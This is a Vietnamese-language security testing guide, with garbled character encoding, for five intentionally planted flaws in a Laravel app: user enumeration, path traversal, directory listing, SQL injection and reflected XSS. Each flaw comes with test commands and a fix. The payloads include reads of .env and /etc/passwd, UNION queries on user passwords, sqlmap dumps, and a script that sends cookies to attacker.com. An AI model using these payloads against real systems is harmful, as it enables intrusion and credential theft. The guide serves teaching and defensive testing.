# ğŸ”’ TÃ i Liá»‡u Kiá»ƒm Thá»­ Báº£o Máº­t - 5 Lá»— Há»•ng Báº£o Máº­t Web Phá»• Biáº¿n

> **âš ï¸ Cáº¢NH BÃO**: TÃ i liá»‡u nÃ y mÃ´ táº£ cÃ¡c lá»— há»•ng báº£o máº­t Ä‘Æ°á»£c táº¡o cÃ³ chá»§ Ã½ trong mÃ´i trÆ°á»ng phÃ¡t triá»ƒn/test. **KHÃ”NG BAO GIá»œ** sá»­ dá»¥ng cÃ¡c ká»¹ thuáº­t nÃ y trÃªn há»‡ thá»‘ng mÃ  báº¡n khÃ´ng cÃ³ quyá»n kiá»ƒm thá»­.

## ğŸ“‹ Má»¥c Lá»¥c

1. [Lá»— há»•ng 1: User Enumeration qua Password Reset](#1-lá»—-há»•ng-user-enumeration-qua-password-reset)
2. [Lá»— há»•ng 2: Path Traversal / Directory Traversal](#2-lá»—-há»•ng-path-traversal--directory-traversal)
3. [Lá»— há»•ng 3: Directory/Path Enumeration](#3-lá»—-há»•ng-directorypath-enumeration)
4. [Lá»— há»•ng 4: SQL Injection](#4-lá»—-há»•ng-sql-injection)
5. [Lá»— há»•ng 5: Reflected Cross-Site Scripting (XSS)](#5-lá»—-há»•ng-reflected-cross-site-scripting-xss)

---

## 1. Lá»— há»•ng User Enumeration qua Password Reset

### ğŸ“Œ MÃ´ táº£

**Má»©c Ä‘á»™ nghiÃªm trá»ng**: ğŸ”´ **CAO**

**Vá»‹ trÃ­**: Backend (`app/Http/Controllers/Auth/AuthController.php`)

**MÃ´ táº£**: Endpoint "QuÃªn máº­t kháº©u" tráº£ vá» pháº£n há»“i khÃ¡c nhau tÃ¹y thuá»™c vÃ o email cÃ³ tá»“n táº¡i trong há»‡ thá»‘ng hay khÃ´ng. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c email nÃ o Ä‘Ã£ Ä‘Äƒng kÃ½ trong há»‡ thá»‘ng.

### ğŸ” CÃ¡c bÆ°á»›c kiá»ƒm thá»­ chi tiáº¿t

#### BÆ°á»›c 1: XÃ¡c Ä‘á»‹nh endpoint

Endpoint: `POST /api/auth/forgot_password`

#### BÆ°á»›c 2: Gá»­i request vá»›i email KHÃ”NG tá»“n táº¡i

```bash
curl -X POST http://localhost:8000/api/auth/forgot_password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"email": "nonexistent@attack.com"}' \
  -v
```

**Káº¿t quáº£ mong Ä‘á»£i**:

```json
{
  "status": "error",
  "message": "Email khÃ´ng tá»“n táº¡i trong há»‡ thá»‘ng.",
  "statusCode": 404
}
```

#### BÆ°á»›c 3: Gá»­i request vá»›i email CÃ“ THá»‚ tá»“n táº¡i

```bash
curl -X POST http://localhost:8000/api/auth/forgot_password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"email": "admin@example.com"}' \
  -v
```

**Káº¿t quáº£ mong Ä‘á»£i** (náº¿u email tá»“n táº¡i):

```json
{
  "status": "success",
  "message": "ÄÆ°á»ng link Ä‘áº·t láº¡i máº­t kháº©u Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘áº¿n email cá»§a báº¡n.",
  "data": null
}
```

#### BÆ°á»›c 4: PhÃ¢n tÃ­ch sá»± khÃ¡c biá»‡t

| TiÃªu chÃ­            | Email khÃ´ng tá»“n táº¡i                   | Email tá»“n táº¡i                                                |
| ------------------- | ------------------------------------- | ------------------------------------------------------------ |
| **Status Code**     | 404                                   | 200                                                          |
| **Response Status** | "error"                               | "success"                                                    |
| **Message**         | "Email khÃ´ng tá»“n táº¡i trong há»‡ thá»‘ng." | "ÄÆ°á»ng link Ä‘áº·t láº¡i máº­t kháº©u Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘áº¿n email cá»§a báº¡n." |

**Káº¿t luáº­n**: Náº¿u cÃ³ sá»± khÃ¡c biá»‡t rÃµ rÃ ng, lá»— há»•ng User Enumeration Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c nháº­n.

### ğŸ›¡ï¸ CÃ¡ch kháº¯c phá»¥c

**File cáº§n sá»­a**: `app/Http/Controllers/Auth/AuthController.php`

**Code an toÃ n**:

```php
public function forgotPassword(Request $request)
{
    // LuÃ´n tráº£ vá» thÃ´ng bÃ¡o giá»‘ng nhau, khÃ´ng tiáº¿t lá»™ email cÃ³ tá»“n táº¡i hay khÃ´ng
    $response = $this->authService->forgotPassword($request);

    // LuÃ´n tráº£ vá» success message giá»‘ng nhau
    return ApiResponse::success(
        null,
        'Náº¿u email tá»“n táº¡i trong há»‡ thá»‘ng, Ä‘Æ°á»ng link Ä‘áº·t láº¡i máº­t kháº©u Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘áº¿n email cá»§a báº¡n.'
    );
}
```

**NguyÃªn táº¯c**:

- LuÃ´n tráº£ vá» cÃ¹ng má»™t thÃ´ng bÃ¡o cho má»i trÆ°á»ng há»£p
- Äáº£m báº£o thá»i gian pháº£n há»“i lÃ  nhÆ° nhau (cÃ³ thá»ƒ thÃªm delay giáº£)
- KhÃ´ng tiáº¿t lá»™ thÃ´ng tin vá» tráº¡ng thÃ¡i email trong há»‡ thá»‘ng

---

## 2. Lá»— há»•ng Path Traversal / Directory Traversal

### ğŸ“Œ MÃ´ táº£

**Má»©c Ä‘á»™ nghiÃªm trá»ng**: ğŸ”´ **Ráº¤T CAO**

**Vá»‹ trÃ­**: Backend (`app/Http/Controllers/File/FileController.php`)

**MÃ´ táº£**: Endpoint download file khÃ´ng kiá»ƒm tra vÃ  sanitize Ä‘Æ°á»ng dáº«n file Ä‘Ãºng cÃ¡ch, cho phÃ©p káº» táº¥n cÃ´ng sá»­ dá»¥ng `../` Ä‘á»ƒ truy cáº­p file ngoÃ i thÆ° má»¥c cho phÃ©p, nhÆ° file cáº¥u hÃ¬nh, file nháº¡y cáº£m cá»§a há»‡ thá»‘ng.

### ğŸ” CÃ¡c bÆ°á»›c kiá»ƒm thá»­ chi tiáº¿t

#### BÆ°á»›c 1: XÃ¡c Ä‘á»‹nh endpoint

Endpoint: `GET /api/file/download?file=<filename>`

#### BÆ°á»›c 2: Kiá»ƒm thá»­ cÆ¡ báº£n vá»›i file há»£p lá»‡

```bash
curl "http://localhost:8000/api/file/download?file=test.txt" \
  -v
```

#### BÆ°á»›c 3: Thá»­ Path Traversal payload cÆ¡ báº£n

```bash
# Thá»­ truy cáº­p file .env (thÆ°á»ng á»Ÿ root cá»§a Laravel)
curl "http://localhost:8000/api/file/download?file=../../../../.env" \
  -v

# Thá»­ truy cáº­p file config
curl "http://localhost:8000/api/file/download?file=../../../config/database.php" \
  -v

# Thá»­ truy cáº­p file há»‡ thá»‘ng (Linux)
curl "http://localhost:8000/api/file/download?file=../../../../etc/passwd" \
  -v
```

#### BÆ°á»›c 4: Thá»­ vá»›i URL encoding

```bash
# Sá»­ dá»¥ng %2e%2e%2f thay vÃ¬ ../
curl "http://localhost:8000/api/file/download?file=..%2f..%2f..%2f..%2f.env" \
  -v

# Sá»­ dá»¥ng %2e%2e%5c cho Windows
curl "http://localhost:8000/api/file/download?file=..%5c..%5c..%5c.env" \
  -v
```

#### BÆ°á»›c 5: Sá»­ dá»¥ng endpoint view Ä‘á»ƒ Ä‘á»c ná»™i dung file

```bash
curl "http://localhost:8000/api/file/view?file=../../../../.env" \
  -v
```

**Káº¿t quáº£ mong Ä‘á»£i náº¿u thÃ nh cÃ´ng**:

- Náº¿u truy cáº­p Ä‘Æ°á»£c file `.env`, báº¡n sáº½ tháº¥y cÃ¡c biáº¿n mÃ´i trÆ°á»ng nháº¡y cáº£m nhÆ°:
  - Database credentials
  - API keys
  - Secret keys
- Náº¿u truy cáº­p Ä‘Æ°á»£c `/etc/passwd`, báº¡n sáº½ tháº¥y danh sÃ¡ch user cá»§a há»‡ thá»‘ng

### ğŸ›¡ï¸ CÃ¡ch kháº¯c phá»¥c

**File cáº§n sá»­a**: `app/Http/Controllers/File/FileController.php`

**Code an toÃ n**:

```php
public function download(Request $request)
{
    $filePath = $request->input('file');

    if (!$filePath) {
        return ApiResponse::error('Tham sá»‘ file lÃ  báº¯t buá»™c', null, 400);
    }

    // 1. Sá»­ dá»¥ng basename() Ä‘á»ƒ loáº¡i bá» path traversal
    $fileName = basename($filePath);

    // 2. Validate extension (whitelist)
    $allowedExtensions = ['pdf', 'jpg', 'png', 'doc', 'docx'];
    $extension = pathinfo($fileName, PATHINFO_EXTENSION);

    if (!in_array(strtolower($extension), $allowedExtensions)) {
        return ApiResponse::error('Loáº¡i file khÃ´ng Ä‘Æ°á»£c phÃ©p', null, 400);
    }

    // 3. XÃ¡c Ä‘á»‹nh Ä‘Æ°á»ng dáº«n an toÃ n
    $safePath = storage_path('app/public/' . $fileName);

    // 4. Kiá»ƒm tra file cÃ³ náº±m trong thÆ° má»¥c cho phÃ©p khÃ´ng
    $realPath = realpath($safePath);
    $allowedDir = realpath(storage_path('app/public'));

    if (!$realPath || strpos($realPath, $allowedDir) !== 0) {
        return ApiResponse::error('File khÃ´ng há»£p lá»‡', null, 403);
    }

    if (!file_exists($realPath)) {
        return ApiResponse::error('File khÃ´ng tá»“n táº¡i', null, 404);
    }

    return response()->download($realPath);
}
```

**NguyÃªn táº¯c**:

- Sá»­ dá»¥ng `basename()` Ä‘á»ƒ loáº¡i bá» path traversal
- Sá»­ dá»¥ng whitelist cho extension vÃ  tÃªn file
- Kiá»ƒm tra Ä‘Æ°á»ng dáº«n thá»±c táº¿ cÃ³ náº±m trong thÆ° má»¥c cho phÃ©p khÃ´ng
- Sá»­ dá»¥ng `realpath()` Ä‘á»ƒ chuáº©n hÃ³a Ä‘Æ°á»ng dáº«n

---

## 3. Lá»— há»•ng Directory/Path Enumeration

### ğŸ“Œ MÃ´ táº£

**Má»©c Ä‘á»™ nghiÃªm trá»ng**: ğŸŸ¡ **TRUNG BÃŒNH - CAO**

**Vá»‹ trÃ­**: Backend (Cáº¥u hÃ¬nh Nginx - `docker/nginx.conf`)

**MÃ´ táº£**: Web server Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ cho phÃ©p liá»‡t kÃª ná»™i dung thÆ° má»¥c (directory listing) khi khÃ´ng cÃ³ file index. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng khÃ¡m phÃ¡ cáº¥u trÃºc thÆ° má»¥c vÃ  phÃ¡t hiá»‡n file nháº¡y cáº£m.

### ğŸ” CÃ¡c bÆ°á»›c kiá»ƒm thá»­ chi tiáº¿t

#### BÆ°á»›c 1: Kiá»ƒm tra directory listing trÃªn thÆ° má»¥c storage

```bash
curl "http://localhost:8000/storage/" \
  -v
```

**Káº¿t quáº£ mong Ä‘á»£i**: Náº¿u directory listing Ä‘Æ°á»£c báº­t, báº¡n sáº½ tháº¥y danh sÃ¡ch file vÃ  thÆ° má»¥c trong HTML format.

#### BÆ°á»›c 2: Sá»­ dá»¥ng cÃ´ng cá»¥ quÃ©t thÆ° má»¥c

```bash
# Sá»­ dá»¥ng ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://localhost:8000/FUZZ \
     -t 50 \
     -mc 200,301,302,403

# Sá»­ dá»¥ng gobuster
gobuster dir -u http://localhost:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

#### BÆ°á»›c 3: Truy cáº­p cÃ¡c thÆ° má»¥c nháº¡y cáº£m

```bash
# Thá»­ truy cáº­p cÃ¡c thÆ° má»¥c thÆ°á»ng cÃ³ thÃ´ng tin nháº¡y cáº£m
curl "http://localhost:8000/storage/logs/" -v
curl "http://localhost:8000/storage/framework/" -v
curl "http://localhost:8000/public/" -v
curl "http://localhost:8000/config/" -v
curl "http://localhost:8000/.git/" -v
```

#### BÆ°á»›c 4: TÃ¬m file backup vÃ  config

```bash
# QuÃ©t cÃ¡c file backup thÆ°á»ng gáº·p
ffuf -w /path/to/wordlist/backup_files.txt \
     -u http://localhost:8000/FUZZ \
     -mc 200

# Wordlist máº«u (backup_files.txt):
# .env.backup
# .env.old
# config.php.bak
# database.php.backup
# web.config.bak
```

**Káº¿t quáº£ mong Ä‘á»£i**: Náº¿u directory listing Ä‘Æ°á»£c báº­t, báº¡n cÃ³ thá»ƒ:

- Xem danh sÃ¡ch file trong thÆ° má»¥c
- PhÃ¡t hiá»‡n file backup, config khÃ´ng Ä‘Æ°á»£c báº£o vá»‡
- KhÃ¡m phÃ¡ cáº¥u trÃºc á»©ng dá»¥ng

### ğŸ›¡ï¸ CÃ¡ch kháº¯c phá»¥c

**File cáº§n sá»­a**: `docker/nginx.conf`

**Code an toÃ n**:

```nginx
server {
    listen 80;
    server_name localhost;
    root /var/www/html/public;
    index index.php index.html;

    charset utf-8;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    # Táº¯t directory listing cho táº¥t cáº£ thÆ° má»¥c
    location /storage {
        autoindex off;  # Táº¯t directory listing
        deny all;       # Hoáº·c tá»« chá»‘i truy cáº­p trá»±c tiáº¿p
    }

    location /public {
        autoindex off;  # Táº¯t directory listing
    }

    # Chá»‰ cho phÃ©p truy cáº­p file cá»¥ thá»ƒ, khÃ´ng cho phÃ©p liá»‡t kÃª
    location ~ ^/storage/(.+)$ {
        autoindex off;
        # Chá»‰ cho phÃ©p truy cáº­p file, khÃ´ng cho phÃ©p directory
    }

    # ... cÃ¡c cáº¥u hÃ¬nh khÃ¡c
}
```

**NguyÃªn táº¯c**:

- LuÃ´n táº¯t `autoindex` trong production
- Sá»­ dá»¥ng `.htaccess` (Apache) hoáº·c cáº¥u hÃ¬nh Nginx Ä‘á»ƒ tá»« chá»‘i truy cáº­p thÆ° má»¥c nháº¡y cáº£m
- Äáº£m báº£o file nháº¡y cáº£m khÃ´ng náº±m trong thÆ° má»¥c public
- Sá»­ dá»¥ng file `.gitignore` Ä‘á»ƒ trÃ¡nh commit file nháº¡y cáº£m

---

## 4. Lá»— há»•ng SQL Injection

### ğŸ“Œ MÃ´ táº£

**Má»©c Ä‘á»™ nghiÃªm trá»ng**: ğŸ”´ **Ráº¤T CAO**

**Vá»‹ trÃ­**: Backend (`app/Repositories/PropertyRepository/PropertyRepository.php`)

**MÃ´ táº£**: Endpoint láº¥y thÃ´ng tin property sá»­ dá»¥ng raw SQL query vá»›i tham sá»‘ khÃ´ng Ä‘Æ°á»£c parameterized, cho phÃ©p káº» táº¥n cÃ´ng chÃ¨n mÃ£ SQL Ä‘á»™c háº¡i Ä‘á»ƒ Ä‘á»c, sá»­a, xÃ³a dá»¯ liá»‡u hoáº·c tháº­m chÃ­ chiáº¿m quyá»n Ä‘iá»u khiá»ƒn database.

### ğŸ” CÃ¡c bÆ°á»›c kiá»ƒm thá»­ chi tiáº¿t

#### BÆ°á»›c 1: XÃ¡c Ä‘á»‹nh endpoint

Endpoint: `GET /api/properties/detail/{id}`

#### BÆ°á»›c 2: Kiá»ƒm thá»­ cÆ¡ báº£n vá»›i ID há»£p lá»‡

```bash
curl "http://localhost:8000/api/properties/detail/1" \
  -H "Accept: application/json" \
  -v
```

#### BÆ°á»›c 3: Thá»­ SQL Injection cÆ¡ báº£n - PhÃ¡ vá»¡ cÃº phÃ¡p SQL

```bash
# ThÃªm dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ phÃ¡ vá»¡ cÃº phÃ¡p SQL
curl "http://localhost:8000/api/properties/detail/1'" \
  -H "Accept: application/json" \
  -v
```

**Káº¿t quáº£ mong Ä‘á»£i**: Náº¿u cÃ³ lá»—i SQL syntax, báº¡n sáº½ tháº¥y thÃ´ng bÃ¡o lá»—i tá»« database:

```json
{
  "message": "SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax..."
}
```

#### BÆ°á»›c 4: XÃ¡c nháº­n SQL Injection vá»›i payload Ä‘Ãºng/sai

```bash
# Payload Ä‘Ãºng - trang sáº½ hoáº¡t Ä‘á»™ng bÃ¬nh thÆ°á»ng
curl "http://localhost:8000/api/properties/detail/1 AND 1=1" \
  -H "Accept: application/json" \
  -v

# Payload sai - trang sáº½ thay Ä‘á»•i (máº¥t ná»™i dung hoáº·c lá»—i)
curl "http://localhost:8000/api/properties/detail/1 AND 1=2" \
  -H "Accept: application/json" \
  -v
```

#### BÆ°á»›c 5: Khai thÃ¡c Ä‘á»ƒ Ä‘á»c dá»¯ liá»‡u tá»« báº£ng khÃ¡c

```bash
# Äá»c thÃ´ng tin user (giáº£ sá»­ cÃ³ báº£ng users)
curl "http://localhost:8000/api/properties/detail/1 UNION SELECT id,email,password FROM users LIMIT 1--" \
  -H "Accept: application/json" \
  -v

# Äá»c thÃ´ng tin tá»« information_schema
curl "http://localhost:8000/api/properties/detail/1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--" \
  -H "Accept: application/json" \
  -v
```

#### BÆ°á»›c 6: Sá»­ dá»¥ng SQLMap Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c

```bash
# CÃ i Ä‘áº·t SQLMap (náº¿u chÆ°a cÃ³)
# pip install sqlmap

# Cháº¡y SQLMap
sqlmap -u "http://localhost:8000/api/properties/detail/1" \
  --batch \
  --dbs \
  --tables \
  --dump
```

**Káº¿t quáº£ mong Ä‘á»£i**: Náº¿u SQL Injection thÃ nh cÃ´ng, báº¡n cÃ³ thá»ƒ:

- Äá»c dá»¯ liá»‡u tá»« cÃ¡c báº£ng khÃ¡c
- Xem cáº¥u trÃºc database
- Äá»c thÃ´ng tin nháº¡y cáº£m (password hash, email, etc.)
- Tháº­m chÃ­ thá»±c thi lá»‡nh trÃªn há»‡ thá»‘ng (náº¿u cÃ³ quyá»n)

### ğŸ›¡ï¸ CÃ¡ch kháº¯c phá»¥c

**File cáº§n sá»­a**: `app/Repositories/PropertyRepository/PropertyRepository.php`

**Code an toÃ n**:

```php
public function find($id)
{
    // âœ… CÃ¡ch an toÃ n: Sá»­ dá»¥ng Eloquent ORM hoáº·c Prepared Statements
    return $this->model::with(['location', 'contact', 'features'])->findOrFail($id);

    // Hoáº·c náº¿u pháº£i dÃ¹ng raw query, sá»­ dá»¥ng parameterized query:
    // $property = DB::select('SELECT * FROM properties WHERE id = ? AND deleted_at IS NULL', [$id]);
    // if (empty($property)) {
    //     throw new ModelNotFoundException();
    // }
    // return $this->model::find($id)->load(['location', 'contact', 'features']);
}
```

**NguyÃªn táº¯c**:

- **LUÃ”N** sá»­ dá»¥ng Prepared Statements hoáº·c Parameterized Queries
- Sá»­ dá»¥ng Eloquent ORM cá»§a Laravel (tá»± Ä‘á»™ng sá»­ dá»¥ng prepared statements)
- **KHÃ”NG BAO GIá»œ** ná»‘i chuá»—i Ä‘á»ƒ táº¡o SQL query
- Validate vÃ  sanitize input trÆ°á»›c khi sá»­ dá»¥ng trong query
- Sá»­ dá»¥ng whitelist cho cÃ¡c giÃ¡ trá»‹ Ä‘Æ°á»£c phÃ©p

**VÃ­ dá»¥ Prepared Statement trong Laravel**:

```php
// âœ… An toÃ n
DB::select('SELECT * FROM properties WHERE id = ?', [$id]);

// âœ… An toÃ n vá»›i named parameters
DB::select('SELECT * FROM properties WHERE id = :id', ['id' => $id]);

// âŒ KHÃ”NG AN TOÃ€N - KHÃ”NG BAO GIá»œ LÃ€M
DB::select("SELECT * FROM properties WHERE id = " . $id);
```

---

## 5. Lá»— há»•ng Reflected Cross-Site Scripting (XSS)

### ğŸ“Œ MÃ´ táº£

**Má»©c Ä‘á»™ nghiÃªm trá»ng**: ğŸ”´ **CAO**

**Vá»‹ trÃ­**: Backend (`app/Http/Controllers/Search/SearchController.php`)

**MÃ´ táº£**: Endpoint tÃ¬m kiáº¿m pháº£n chiáº¿u tham sá»‘ `q` (query) trá»±c tiáº¿p vÃ o response mÃ  khÃ´ng Ä‘Æ°á»£c escape. Náº¿u frontend render trá»±c tiáº¿p giÃ¡ trá»‹ nÃ y, káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n mÃ£ JavaScript Ä‘á»™c háº¡i Ä‘á»ƒ Ä‘Ã¡nh cáº¯p cookie, session, hoáº·c thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng thay máº·t ngÆ°á»i dÃ¹ng.

### ğŸ” CÃ¡c bÆ°á»›c kiá»ƒm thá»­ chi tiáº¿t

#### BÆ°á»›c 1: XÃ¡c Ä‘á»‹nh endpoint

Endpoint: `GET /api/search/properties?q=<query>`

#### BÆ°á»›c 2: Thá»­ payload XSS cÆ¡ báº£n

```bash
# Payload XSS Ä‘Æ¡n giáº£n
curl -G "http://localhost:8000/api/search/properties" \
  --data-urlencode "q=<script>alert('XSS')</script>" \
  -H "Accept: application/json" \
  -v
```

**Kiá»ƒm tra response**: TÃ¬m xem payload cÃ³ xuáº¥t hiá»‡n nguyÃªn váº¹n trong response khÃ´ng:

```bash
curl -G "http://localhost:8000/api/search/properties" \
  --data-urlencode "q=<script>alert('XSS')</script>" \
  -H "Accept: application/json" | grep -i "script"
```

#### BÆ°á»›c 3: Thá»­ cÃ¡c payload XSS khÃ¡c

```bash
# Payload vá»›i event handler
curl -G "http://localhost:8000/api/search/properties" \
  --data-urlencode "q=<img src=x onerror=alert('XSS')>" \
  -H "Accept: application/json"

# Payload vá»›i SVG
curl -G "http://localhost:8000/api/search/properties" \
  --data-urlencode "q=<svg onload=alert('XSS')>" \
  -H "Accept: application/json"

# Payload Ä‘Ã¡nh cáº¯p cookie (giáº£ láº­p)
curl -G "http://localhost:8000/api/search/properties" \
  --data-urlencode "q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" \
  -H "Accept: application/json"
```

#### BÆ°á»›c 4: Kiá»ƒm tra trong trÃ¬nh duyá»‡t

1. Má»Ÿ trÃ¬nh duyá»‡t vÃ  truy cáº­p:

```
http://localhost:8000/api/search/properties?q=<script>alert('XSS')</script>
```

2. Náº¿u há»™p thoáº¡i alert xuáº¥t hiá»‡n, XSS Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c nháº­n.

3. Kiá»ƒm tra mÃ£ nguá»“n HTML (náº¿u cÃ³ frontend render):
   - Má»Ÿ Developer Tools (F12)
   - TÃ¬m payload trong HTML
   - Náº¿u payload xuáº¥t hiá»‡n nguyÃªn váº¹n `<script>alert('XSS')</script>` mÃ  khÃ´ng bá»‹ escape thÃ nh `&lt;script&gt;...`, lá»— há»•ng tá»“n táº¡i.

#### BÆ°á»›c 5: Sá»­ dá»¥ng cÃ´ng cá»¥ tá»± Ä‘á»™ng

```bash
# Sá»­ dá»¥ng XSSer
xsser -u "http://localhost:8000/api/search/properties?q=XSS" --auto

# Sá»­ dá»¥ng XSS Scanner
python3 xsstrike.py -u "http://localhost:8000/api/search/properties?q=test"
```

**Káº¿t quáº£ mong Ä‘á»£i**: Náº¿u XSS thÃ nh cÃ´ng:

- Payload JavaScript Ä‘Æ°á»£c thá»±c thi trong trÃ¬nh duyá»‡t
- Cookie/session cÃ³ thá»ƒ bá»‹ Ä‘Ã¡nh cáº¯p
- Káº» táº¥n cÃ´ng cÃ³ thá»ƒ thá»±c hiá»‡n hÃ nh Ä‘á»™ng thay máº·t ngÆ°á»i dÃ¹ng

### ğŸ›¡ï¸ CÃ¡ch kháº¯c phá»¥c

**File cáº§n sá»­a**: `app/Http/Controllers/Search/SearchController.php`

**Code an toÃ n**:

```php
public function search(Request $request)
{
    $keyword = $request->input('q', '');

    // âœ… Escape output trÆ°á»›c khi tráº£ vá»
    $escapedKeyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');

    $data = $this->searchService->search($request);

    // âœ… Sá»­ dá»¥ng giÃ¡ trá»‹ Ä‘Ã£ Ä‘Æ°á»£c escape
    if ($data && method_exists($data, 'getCollection')) {
        $data->getCollection()->transform(function ($item) use ($escapedKeyword) {
            $item->search_keyword = $escapedKeyword; // âœ… ÄÃ£ Ä‘Æ°á»£c escape
            return $item;
        });
    }

    $message = "Káº¿t quáº£ tÃ¬m kiáº¿m cho: " . $escapedKeyword; // âœ… ÄÃ£ Ä‘Æ°á»£c escape

    return $this->handleServiceResponse(
        $data,
        $message,
        "Láº¥y thÃ´ng tin tháº¥t báº¡i",
        200,
        500
    );
}
```

**NguyÃªn táº¯c**:

- **LUÃ”N** escape output khi render vÃ o HTML
- Sá»­ dá»¥ng `htmlspecialchars()` trong PHP
- Sá»­ dá»¥ng template engine cÃ³ auto-escaping (Blade trong Laravel tá»± Ä‘á»™ng escape)
- Validate input: chá»‰ cháº¥p nháº­n dá»¯ liá»‡u Ä‘Ãºng Ä‘á»‹nh dáº¡ng
- Sá»­ dá»¥ng Content Security Policy (CSP) Ä‘á»ƒ giáº£m thiá»ƒu tÃ¡c Ä‘á»™ng cá»§a XSS
- KhÃ´ng bao giá» sá»­ dá»¥ng `innerHTML` hoáº·c `dangerouslySetInnerHTML` trong frontend

**VÃ­ dá»¥ trong Laravel Blade**:

```blade
{{-- âœ… An toÃ n - tá»± Ä‘á»™ng escape --}}
{{ $keyword }}

{{-- âŒ KHÃ”NG AN TOÃ€N - khÃ´ng escape --}}
{!! $keyword !!}
```

**VÃ­ dá»¥ trong JavaScript/React**:

```javascript
// âœ… An toÃ n - React tá»± Ä‘á»™ng escape
<div>{keyword}</div>

// âŒ KHÃ”NG AN TOÃ€N - khÃ´ng escape
<div dangerouslySetInnerHTML={{__html: keyword}}></div>
```

---

## ğŸ“Š Tá»•ng Káº¿t

### Báº£ng So SÃ¡nh Má»©c Äá»™ NghiÃªm Trá»ng

| STT | Lá»— Há»•ng               | Má»©c Äá»™            | Vá»‹ TrÃ­                    | TÃ¡c Äá»™ng                                      |
| --- | --------------------- | ----------------- | ------------------------- | --------------------------------------------- |
| 1   | User Enumeration      | ğŸ”´ CAO            | Backend                   | Tiáº¿t lá»™ thÃ´ng tin ngÆ°á»i dÃ¹ng                  |
| 2   | Path Traversal        | ğŸ”´ Ráº¤T CAO        | Backend                   | Truy cáº­p file nháº¡y cáº£m, lá»™ thÃ´ng tin há»‡ thá»‘ng |
| 3   | Directory Enumeration | ğŸŸ¡ TRUNG BÃŒNH-CAO | Backend (Config)          | KhÃ¡m phÃ¡ cáº¥u trÃºc, phÃ¡t hiá»‡n file nháº¡y cáº£m    |
| 4   | SQL Injection         | ğŸ”´ Ráº¤T CAO        | Backend                   | Äá»c/sá»­a/xÃ³a dá»¯ liá»‡u, chiáº¿m quyá»n database     |
| 5   | Reflected XSS         | ğŸ”´ CAO            | Backend (Frontend render) | ÄÃ¡nh cáº¯p session, thá»±c thi mÃ£ Ä‘á»™c             |

### ğŸ”§ Checklist Kháº¯c Phá»¥c

- [ ] Sá»­a User Enumeration: LuÃ´n tráº£ vá» thÃ´ng bÃ¡o giá»‘ng nhau
- [ ] Sá»­a Path Traversal: Sá»­ dá»¥ng basename() vÃ  whitelist
- [ ] Táº¯t Directory Listing: Cáº¥u hÃ¬nh autoindex off
- [ ] Sá»­a SQL Injection: Sá»­ dá»¥ng Prepared Statements
- [ ] Sá»­a XSS: Escape táº¥t cáº£ output

### ğŸ“š TÃ i Liá»‡u Tham Kháº£o

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Laravel Security Documentation](https://laravel.com/docs/security)
- [CWE-200: Information Exposure](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)

---

## âš ï¸ LÆ°u Ã Quan Trá»ng

1. **Chá»‰ sá»­ dá»¥ng trong mÃ´i trÆ°á»ng test/phÃ¡t triá»ƒn**: CÃ¡c lá»— há»•ng nÃ y Ä‘Æ°á»£c táº¡o cÃ³ chá»§ Ã½ Ä‘á»ƒ há»c táº­p vÃ  kiá»ƒm thá»­.

2. **KhÃ´ng sá»­ dá»¥ng trÃªn production**: TrÆ°á»›c khi deploy lÃªn production, **PHáº¢I** kháº¯c phá»¥c táº¥t cáº£ cÃ¡c lá»— há»•ng.

3. **Kiá»ƒm thá»­ cÃ³ trÃ¡ch nhiá»‡m**: Chá»‰ kiá»ƒm thá»­ trÃªn há»‡ thá»‘ng mÃ  báº¡n cÃ³ quyá»n. Kiá»ƒm thá»­ trÃªn há»‡ thá»‘ng khÃ´ng Ä‘Æ°á»£c phÃ©p lÃ  báº¥t há»£p phÃ¡p.

4. **BÃ¡o cÃ¡o lá»— há»•ng**: Náº¿u phÃ¡t hiá»‡n lá»— há»•ng trÃªn há»‡ thá»‘ng cá»§a ngÆ°á»i khÃ¡c, hÃ£y bÃ¡o cÃ¡o má»™t cÃ¡ch cÃ³ trÃ¡ch nhiá»‡m (Responsible Disclosure).

---

**NgÃ y táº¡o**: $(date)  
**PhiÃªn báº£n**: 1.0  
**TÃ¡c giáº£**: Security Team
